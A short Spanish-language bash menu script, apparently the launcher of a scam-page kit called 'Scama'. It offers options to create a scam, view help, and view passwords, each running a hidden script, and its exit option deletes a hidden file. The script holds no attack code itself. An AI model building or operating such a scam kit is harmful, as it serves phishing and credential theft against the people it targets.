bash .banner
echo "Introduce la opcion que deseas usar:"
echo ""
echo "1)Crear Scam"
echo "2)Ayuda"
echo "3)Contraseñas"
echo "4)Salir"
echo ""
read num

if [ "$num" = "1" ]; then
bash .cr
fi

if [ "$num" = "2" ]; then
bash .ay
fi

if [ "$num" = "3" ]; then
bash .tr
fi

if [ "$num" = "4" ]; then
rm -fr .sx
bash .banner
echo "                           Gracias por usar Scama!!"
fi
